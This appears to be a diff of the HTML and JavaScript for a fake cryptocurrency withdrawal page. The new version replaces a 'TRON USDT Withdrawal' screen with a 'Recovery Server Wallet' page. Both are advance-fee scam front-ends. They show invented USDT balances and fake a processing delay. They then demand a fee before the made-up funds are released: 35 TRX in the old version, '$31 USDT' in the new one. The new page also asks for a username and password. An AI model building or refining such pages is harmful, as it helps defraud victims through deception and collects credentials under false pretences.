@@ -1,207 +1,176 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>TRON USDT Withdrawal</title>
+  <meta charset="UTF-8">
+  <title>Recovery Server Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    :root {
-      --tron-red: #ff2d55;
-      --bg-dark: #0b0f14;
-      --card-bg: #121820;
-      --text: #eaf1f8;
-      --muted: #9fb3c8;
-      --error: #ff5c5c;
-    }
-
     body {
       margin: 0;
-      font-family: system-ui, sans-serif;
-      background: var(--bg-dark);
-      color: var(--text);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 16px;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background-color: #0f0f0f;
+      color: #fff;
     }
-
-    .card {
-      background: var(--card-bg);
-      border-radius: 16px;
-      padding: 24px;
-      width: 100%;
+    .container {
       max-width: 420px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+      margin: auto;
+      padding: 20px;
     }
-
-    .logo {
-      font-size: 22px;
-      font-weight: 800;
-      color: var(--tron-red);
-      margin-bottom: 12px;
-    }
-
-    h1 {
-      font-size: 20px;
-      margin-bottom: 12px;
-      color: var(--tron-red);
-    }
-
-    .balance {
-      font-size: 16px;
-      margin-bottom: 12px;
-      color: var(--muted);
-    }
-
-    .amount {
-      font-size: 18px;
+    .section {
+      background-color: #1a1a1a;
+      padding: 16px;
+      border-radius: 12px;
       margin-bottom: 16px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.4);
     }
-
-    .loader {
-      width: 64px;
-      height: 64px;
-      border: 6px solid rgba(255,255,255,0.1);
-      border-top: 6px solid var(--tron-red);
-      border-radius: 50%;
-      margin: 20px auto;
-      animation: spin 1s linear infinite;
-      display: none;
+    h2, h3 {
+      margin-top: 0;
+      color: #f0f0f0;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    .btn {
-      appearance: none;
-      border: none;
-      background: var(--tron-red);
-      color: white;
-      padding: 12px 16px;
-      border-radius: 10px;
-      font-weight: 600;
-      cursor: pointer;
-      box-shadow: 0 6px 18px rgba(255,45,85,0.25);
-      margin-top: 12px;
+    input {
       width: 100%;
-    }
-
-    .form-box {
-      display: none;
-      margin-top: 16px;
-      text-align: left;
-    }
-
-    .form-box label {
-      font-size: 14px;
-      color: var(--muted);
-      margin-bottom: 4px;
-      display: block;
-    }
-
-    .form-box input {
-      width: 100%;
-      padding: 10px;
-      border-radius: 8px;
-      border: 1px solid #2a3746;
-      background: #0e141b;
-      color: var(--text);
-      margin-bottom: 12px;
-      font-size: 15px;
-    }
-
-    .error {
-      display: none;
-      margin-top: 20px;
-      padding: 14px;
-      background: rgba(255,92,92,0.1);
-      border: 1px solid var(--error);
-      border-radius: 8px;
-      color: var(--error);
-      font-size: 14px;
-      text-align: left;
-    }
-
-    .tx-info {
-      display: none;
-      margin-top: 16px;
-      font-size: 14px;
-      text-align: left;
-      background: rgba(255,255,255,0.05);
       padding: 12px;
-      border-radius: 10px;
+      border: none;
+      border-radius: 6px;
+      margin-bottom: 12px;
+      font-size: 1em;
+      background-color: #262626;
+      color: #fff;
     }
-
-    .tx-info strong {
-      color: var(--tron-red);
+    .button {
+      background: linear-gradient(90deg, #ffb200, #ff7c00);
+      color: #000;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      width: 100%;
+      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: opacity 0.3s;
     }
-
-    @media (max-width: 480px) {
-      h1 { font-size: 18px; }
-      .amount { font-size: 16px; }
-      .btn { font-size: 15px; }
+    .button:hover {
+      opacity: 0.85;
+    }
+    .crypto-card {
+      display: flex;
+      justify-content: space-between;
+      background-color: #262626;
+      padding: 12px;
+      border-radius: 8px;
+      margin-bottom: 10px;
+      font-size: 0.95em;
+    }
+    .notice {
+      background-color: #262626;
+      padding: 12px;
+      border-left: 4px solid #ff7c00;
+      border-radius: 6px;
+      margin-top: 12px;
+      font-size: 0.9em;
+    }
+    .spinner {
+      margin: 20px auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid rgba(255,255,255,0.2);
+      border-top: 4px solid #ff7c00;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading-text {
+      text-align: center;
+      font-size: 0.9em;
+      opacity: 0.8;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="logo">TRON Wallet</div>
-    <h1>USDT Withdrawal</h1>
-    <div class="balance">Available Balance: $107,000</div>
-    <div class="amount">Maximum Withdrawal: <strong>107,000 USDT</strong></div>
-    <button class="btn" id="withdrawBtn">Withdraw</button>
+  <div class="container">
 
-    <div class="form-box" id="formBox">
-      <label for="walletAddress">USDT Wallet Address</label>
-      <input type="text" id="walletAddress" placeholder="Enter your USDT wallet address" />
-      <button class="btn" id="confirmBtn">Confirm Withdrawal</button>
+    <!-- Registration -->
+    <div class="section" id="register">
+      <h2>Register Account</h2>
+      <input type="text" id="username" placeholder="Enter username">
+      <input type="password" id="password" placeholder="Enter password">
+      <button class="button" onclick="registerUser()">REGISTER</button>
     </div>
 
-    <div class="loader" id="loader"></div>
-
-    <div class="error" id="errorBox">
-      ⚠️ Transaction Error: Insufficient TRX.<br />
-      Immediate release requires <strong>35 TRX</strong>.
+    <!-- Dashboard -->
+    <div class="section" id="dashboard" style="display:none;">
+      <h2>Dashboard</h2>
+      <div class="crypto-card"><span>USDT Balance</span><span>$7000 USDT</span></div>
+      <button class="button" onclick="showWithdraw()">WITHDRAW</button>
     </div>
 
-    <div class="tx-info" id="txInfo">
-      <div><strong>Status:</strong> Locked</div>
-      <div><strong>TXID:</strong> Locked</div>
-      <div><strong>Message:</strong> Insufficient TRX – 35 TRX required</div>
+    <!-- Withdraw -->
+    <div class="section" id="withdraw" style="display:none;">
+      <h2>Withdraw USDT</h2>
+      <input type="text" id="address" placeholder="Enter destination address">
+      <button class="button" onclick="confirmWithdraw()">CONFIRM WITHDRAWAL</button>
     </div>
+
+    <!-- Loading -->
+    <div class="section" id="loading" style="display:none;">
+      <div class="spinner"></div>
+      <div class="loading-text">Processing transaction...</div>
+    </div>
+
+    <!-- Receipt -->
+    <div class="section" id="receipt" style="display:none;">
+      <h2>Transaction Receipt</h2>
+      <p><strong>Status:</strong> Pending ⏳</p>
+      <p><strong>Withdrawal Method:</strong> USDT</p>
+      <p><strong>Destination:</strong> <span id="receiptAddress">—</span></p>
+      <p><strong>Amount:</strong> $7000 USDT</p>
+      <p><strong>Withdrawal Fee:</strong> <span style="color:#ff4d4d;">$31 USDT Required</span></p>
+      <div class="notice">
+        <strong>⚠️ Notice:</strong>
+        <p>Your withdrawal is pending. A one‑time fee of <strong>$31 USDT</strong> is required to finalize.</p>
+        <p>Until this fee is completed, your transaction will remain pending and cannot be finalized.</p>
+      </div>
+      <button class="button" onclick="alert('Redirecting to fee payment...')">PAY $31 USDT NOW</button>
+    </div>
+
   </div>
 
   <script>
-    const withdrawBtn = document.getElementById('withdrawBtn');
-    const formBox = document.getElementById('formBox');
-    const confirmBtn = document.getElementById('confirmBtn');
-    const loader = document.getElementById('loader');
-    const errorBox = document.getElementById('errorBox');
-    const txInfo = document.getElementById('txInfo');
-
-    withdrawBtn.addEventListener('click', () => {
-      withdrawBtn.style.display = 'none';
-      formBox.style.display = 'block';
-    });
-
-    confirmBtn.addEventListener('click', () => {
-      const address = document.getElementById('walletAddress').value.trim();
-      if (!address) {
-        alert("Please enter your USDT wallet address.");
-        return;
+    function registerUser() {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+      if(user && pass) {
+        document.getElementById('register').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+      } else {
+        alert("Please enter username and password");
       }
+    }
 
-      formBox.style.display = 'none';
-      loader.style.display = 'block';
+    function showWithdraw() {
+      document.getElementById('dashboard').style.display = 'none';
+      document.getElementById('withdraw').style.display = 'block';
+    }
 
-      // Simulate 4–7 second transaction processing
-      const delay = Math.floor(Math.random() * (7000 - 4000 + 1)) + 4000;
-      setTimeout(() => {
-        loader.style.display = 'none';
-        errorBox.style.display = 'block';
-        txInfo.style.display = 'block';
-      }, delay);
-    });
+    function confirmWithdraw() {
+      const addr = document.getElementById('address').value;
+      if(addr) {
+        document.getElementById('withdraw').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+        setTimeout(() => {
+          document.getElementById('loading').style.display = 'none';
+          document.getElementById('receipt').style.display = 'block';
+          document.getElementById('receiptAddress').textContent = addr;
+        }, 3000);
+      } else {
+        alert("Please enter destination address");
+      }
+    }
   </script>
 </body>
 </html>
+
